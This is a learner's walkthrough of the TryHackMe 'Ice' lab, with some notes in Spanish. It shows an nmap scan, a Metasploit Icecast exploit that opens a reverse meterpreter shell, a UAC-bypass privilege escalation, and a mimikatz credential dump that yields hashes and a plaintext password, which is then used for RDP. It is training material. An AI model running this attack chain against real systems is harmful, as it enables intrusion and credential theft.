## Task 1 Connect

## Task 2 - Recon

### Deploy the machine! This may take up to three minutes to start.

Ans > clic

### Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room '[Nmap](https://tryhackme.com/room/furthernmap)' prior to this room.

```
nmap -n -Pn -sV 10.10.8.156  --min-rate 5000 -vv -p- -oN ice-nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 21:10 CDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 21:10
Scanning 10.10.8.156 [65535 ports]
Discovered open port 3389/tcp on 10.10.8.156
Discovered open port 135/tcp on 10.10.8.156
Discovered open port 139/tcp on 10.10.8.156
Discovered open port 445/tcp on 10.10.8.156
Increasing send delay for 10.10.8.156 from 0 to 5 due to 544 out of 1811 dropped probes since last increase.
Increasing send delay for 10.10.8.156 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 49154/tcp on 10.10.8.156
Discovered open port 5357/tcp on 10.10.8.156
Increasing send delay for 10.10.8.156 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.8.156 from 20 to 40 due to max_successful_tryno increase to 6
Discovered open port 49159/tcp on 10.10.8.156
Increasing send delay for 10.10.8.156 from 40 to 80 due to 607 out of 2021 dropped probes since last increase.
Discovered open port 8000/tcp on 10.10.8.156
Increasing send delay for 10.10.8.156 from 80 to 160 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.8.156 from 160 to 320 due to max_successful_tryno increase to 8
Increasing send delay for 10.10.8.156 from 320 to 640 due to 535 out of 1781 dropped probes since last increase.
Increasing send delay for 10.10.8.156 from 640 to 1000 due to max_successful_tryno increase to 9
Warning: 10.10.8.156 giving up on port because retransmission cap hit (10).
Discovered open port 49153/tcp on 10.10.8.156
Discovered open port 49152/tcp on 10.10.8.156
Discovered open port 49158/tcp on 10.10.8.156
Discovered open port 49160/tcp on 10.10.8.156
Completed SYN Stealth Scan at 21:10, 23.23s elapsed (65535 total ports)
Initiating Service scan at 21:10
Scanning 12 services on 10.10.8.156
Service scan Timing: About 58.33% done; ETC: 21:12 (0:00:40 remaining)
Completed Service scan at 21:11, 61.93s elapsed (12 services on 1 host)
NSE: Script scanning 10.10.8.156.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:11
Completed NSE at 21:11, 7.24s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:11
Completed NSE at 21:11, 0.76s elapsed
Nmap scan report for 10.10.8.156
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-10 21:10:18 CDT for 94s
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 125 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 125
5357/tcp  open  http         syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         syn-ack ttl 125 Icecast streaming media server
49152/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.35 seconds
           Raw packets sent: 112705 (4.959MB) | Rcvd: 86522 (3.461MB)

```

### Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?


Ans> 3389

### What service did nmap identify as running on port 8000? (First word of this service)

Ans> Icecast

### What does Nmap identify as the hostname of the machine? (All caps for the answer)

Ans> DARK-PC

## Task 3 - Gain Access
### Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use https://www.cvedetails.com for this question and the next.


cvedetails.com > search by product > Icecast , RCE 7.5 impacto

https://www.cvedetails.com/cve/CVE-2004-1561/

Ans> 

6.4

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

Ans> 

CVE-2004-1561

### Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

```
msfconsole -q

msf6 > search Icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp





```

### After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module.

```
exploit/windows/http/icecast_header
```

 `
### Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

```
msf6 exploit(windows/http/icecast_header) > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > 


```
### Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?


```
msf6 exploit(windows/http/icecast_header) > show options 

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/us
                                      ing-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)



msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.8.156
rhosts => 10.10.8.156

```

Ans> RHOSTS

### First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

```
msf6 exploit(windows/http/icecast_header) > set lhost tun0
lhost => 10.2.111.254
msf6 exploit(windows/http/icecast_header) > options 

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/us
                                      ing-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.111.254     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.


msf6> exploit

```

## Task 4 - Escalate

### Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

Ans> 
meterpreter

### What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module.

```
meterpreter > getuid 
Server username: Dark-PC\Dark
meterpreter > 

```

Ans> 

dark

### What build of Windows is the system?

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 


```

Ans> 
7601

### Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

x64

### Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

```
 run post/multi/recon/local_exploit_suggester 

[*] 10.10.8.156 - Collecting local exploits for x86/windows...
[*] 10.10.8.156 - 198 exploit checks are being tried...
[+] 10.10.8.156 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.8.156 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.8.156 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.8.156 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42


```

Ans> click

### Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?


Ans> exploit/windows/local/bypassuac_eventvwr

Nota> era el segundo , no el primero, al menos ahora que lo hago


### Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/icecast_header) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.2.111.254:4444 -> 10.10.8.156:492
                                                             42 (10.10.8.156)

msf6 exploit(windows/http/icecast_header) > 

```

### Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

```
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.197.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

```

### Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

```
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.197.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

```


### Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

Ans> 
LHOST

### Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

```
msf6 exploit(windows/local/bypassuac_eventvwr) > ip a
[*] exec: ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:df:f3:45 brd ff:ff:ff:ff:ff:ff
    inet 172.16.197.128/24 brd 172.16.197.255 scope global dynamic noprefixroute eth0
       valid_lft 1313sec preferred_lft 1313sec
    inet6 fe80::20c:29ff:fedf:f345/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.2.111.254/17 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::4fce:1eb1:c18a:cac6/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever




msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 10.2.111.254
lhost => 10.2.111.254
msf6 exploit(windows/local/bypassuac_eventvwr) > options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.111.254     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

```

### After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

```
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.2.111.254:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (176198 bytes) to 10.10.8.156
[*] Meterpreter session 2 opened (10.2.111.254:4444 -> 10.10.8.156:49254) at 2024-10-10 22:15:45 -0500
[*] Cleaning up registry keys ...

meterpreter > getuid 
Server username: Dark-PC\Dark



```

### Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

- ya estabamos ahi

### We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?




```

meterpreter > getprivs
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege

SeTakeOwnershipPrivilege

SeTimeZonePrivilege
SeUndockPrivilege


```

Ans>

SeTakeOwnershipPrivilege

## Task 5 - Looting

### Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

```
meterpreter > ps

Process List
============

 PID   PPID  Name             Arch  Session  User                       Path
 ---   ----  ----             ----  -------  ----                       ----
 0     0     [System Process
             ]
 4     0     System           x64   0
 396   696   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svcho
                                                                        st.exe
 416   4     smss.exe         x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\smss.
                                                                        exe
 548   540   csrss.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss
                                                                        .exe
 600   540   wininit.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\winin
                                                                        it.exe
 608   588   csrss.exe        x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss
                                                                        .exe
 656   588   winlogon.exe     x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\winlo
                                                                        gon.exe
 684   696   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svcho
                                                                        st.exe
 696   600   services.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\servi
                                                                        ces.exe
 704   600   lsass.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsass
                                                                        .exe
 712   600   lsm.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsm.e
                                                                        xe
 824   696   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svcho
                                                                        st.exe
 892   696   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svcho
                                             ICE                        st.exe
 940   696   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svcho
                                             E                          st.exe
 1060  696   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svcho
                                             E                          st.exe
 1144  696   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svcho
                                             ICE                        st.exe
 1272  696   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\spool
                                                                        sv.exe
 1332  696   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svcho
                                             E                          st.exe
 1428  824   WmiPrvSE.exe     x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\wbem\
                                             ICE                        WmiPrvSE.exe
 1436  696   taskhost.exe     x64   1        Dark-PC\Dark               C:\Windows\System32\taskh
                                                                        ost.exe

```



### In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 


```
 1272  696   spoolsv.exe  
```

Ans>
spoolsv.exe

### Migrate to this process now with the command `migrate -N PROCESS_NAME`

```
meterpreter > migrate 1272
[*] Migrating from 3016 to 1272...
[*] Migration completed successfully.

```

### Let's check what user we are now with the command `getuid`. What user is listed?

```
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```

Ans>NT AUTHORITY\SYSTEM

### Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)


```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > 


```

ans> click

### Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 


```
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)


meterpreter > 

```

Ans > click
\
### Which command allows up to retrieve all credentials?

```
Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)

```

Ans> 

creds_all

### Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

```
 meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                        NTLM                       SHA1
--------  ------   --                        ----                       ----
Dark      Dark-PC  e52cac67419a9a22ecb08369  7c4fe5eada682714a036e3937  0d082c4b4f2aeafb67fd0ea56
                   099ed302                  8362bab                    8a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

```

Ans>

Password01!



### Task 6 Post-Exploitation

### Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes


Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>.

```

### What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)


Ans> 

hasdump

### While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?


Ans> 

screenshare


### How about if we wanted to record from a microphone attached to the system?
Ans> 

record_mic

### To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

Ans>
timestomp

### Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?  Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.



Ans>

golden_ticket_create


### One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`


```
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20241010223552_default_10.10.10.157_host.windows.cle_797282.txt
meterpreter > 

```

### RDP

```
desktop 10.10.52.194 -uDark -pPassword01! 
```


## Tarea 7  - Crédito adicional

No por tiempo solo CLick

```
searchsploit Icecast                                      
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                        | multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service          | multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String             | windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                             | unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                | windows/remote/568.c
